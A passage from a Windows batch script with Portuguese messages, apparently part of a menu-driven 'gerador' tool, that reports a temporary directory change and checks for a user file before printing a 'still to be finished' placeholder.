echo o diretorio do gerador foi alterado para C:\arquivos_temporarios_do_gerador
echo temporariamente.
pause
goto inicio
:com9
if not exist %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\APUA9.gc goto notpodiss
cls
echo FALTA CONCLUIR...
pause
goto com